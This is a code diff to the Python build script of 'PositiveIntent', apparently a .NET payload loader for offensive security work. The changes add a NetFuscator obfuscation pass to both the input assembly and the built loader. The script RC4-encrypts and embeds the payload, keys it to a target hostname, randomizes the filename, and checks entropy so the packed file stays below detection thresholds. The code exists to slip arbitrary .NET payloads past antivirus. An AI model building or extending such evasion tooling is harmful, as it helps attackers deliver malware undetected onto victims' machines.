@@ -51,6 +51,7 @@ def build(assembly_name):
     else:
         subprocess.run(["msbuild", solution_path, "-r:true", "-p:Configuration=Release"], check=True, stdout = subprocess.DEVNULL)
 
+    # todo: migrate this functionality into NetFuscator - check entropy of assembly after obfuscation and embed resource file(s) before writing final obfuscated assembly
     if(entropy.run(assembly_output_path) > 5.50):
         for root, dirs, files in os.walk(resources_directory_path, topdown=True):
             for file_name in files:
@@ -82,6 +83,7 @@ if __name__=="__main__":
     if sys.platform == 'win32':
         colorama.init()
     num_chunks = random.randint(10, 30)
+    obfuscator_file_path = os.path.normpath(os.path.join(os.path.dirname(os.path.abspath(__file__)), "NetFuscator/NetFuscator.exe"))
     
     # parse arguments
     parser = argparse.ArgumentParser(description='PositiveIntent .NET Loader')
@@ -117,28 +119,41 @@ if __name__=="__main__":
         else:
             assembly_name, key = obfuscate.run(args.hostname, num_chunks, None, None)
 
-        print(colorama.Fore.GREEN + "[+] " + colorama.Style.RESET_ALL + f'Obfuscated loader source files')
+        print(colorama.Fore.GREEN + "[+] " + colorama.Style.RESET_ALL + f'Updated placeholders in loader source files')
         print(colorama.Fore.GREEN + "[+] " + colorama.Style.RESET_ALL + f'Keyed on hostname {args.hostname}')
         print(colorama.Fore.GREEN + "[+] " + colorama.Style.RESET_ALL + f"Randomized loader filename")
-    except Exception as exception: # is this error handling?
+    except Exception as exception:
         print(colorama.Fore.RED + "[-] " + colorama.Style.RESET_ALL + f'Failed to obfuscate source files')
         print(traceback.print_exc())
         sys.exit(-1)
 
-    # encrypt .NET assembly and embed as a resource file
+    # obfuscate input assembly, encrypt it, and embed as a resource file
     try:
-        rc4.run(args.file, num_chunks, key.encode('utf-8'))
-        print(colorama.Fore.GREEN + "[+] " + colorama.Style.RESET_ALL + f"Encrypted and embedded {args.file.name} as a resource file")
+        if sys.platform == 'win32':
+            subprocess.run([obfuscator_file_path, args.file.name], check=True, stdout = subprocess.DEVNULL)
+        else:
+            # todo: update for Linux
+            subprocess.run([obfuscator_file_path, args.file.name], check=True, stdout = subprocess.DEVNULL)
+        print(colorama.Fore.GREEN + "[+] " + colorama.Style.RESET_ALL + f"Obfuscated {os.path.basename(args.file.name)}")
+        rc4.run(f"obfuscated_{os.path.basename(args.file.name)}", num_chunks, key.encode('utf-8'))
+        print(colorama.Fore.GREEN + "[+] " + colorama.Style.RESET_ALL + f"Encrypted and embedded {os.path.basename(args.file.name)} as a resource file")
         if(args.writetofile):
             print(colorama.Fore.BLUE + "[*] " + colorama.Style.RESET_ALL + f"Your decryption key is {key}")
-    except Exception as exception: # we're really doing this
+    except Exception as exception:
         print(colorama.Fore.RED + "[-] " + colorama.Style.RESET_ALL + f'Failed to encrypt and embed .NET assembly')
         print(traceback.print_exc())
         sys.exit(-1)
 
     # build loader and adjust entropy
+    assembly_output_path = os.path.normpath(os.path.join(os.path.dirname(os.path.abspath(__file__)), f"temp/PositiveIntent/bin/Release/net451/{assembly_name}.exe"))
     try:
         build(assembly_name)
+        if sys.platform == 'win32':
+            subprocess.run([obfuscator_file_path, assembly_output_path], check=True, stdout = subprocess.DEVNULL)
+        else:
+            # todo: update for Linux
+            subprocess.run([obfuscator_file_path, assembly_output_path], check=True, stdout = subprocess.DEVNULL)
+        print(colorama.Fore.GREEN + "[+] " + colorama.Style.RESET_ALL + "Obfuscated loader")
     except Exception as exception:
         print(colorama.Fore.RED + "[-] " + colorama.Style.RESET_ALL + f'Failed to build loader.')
         print(traceback.print_exc())
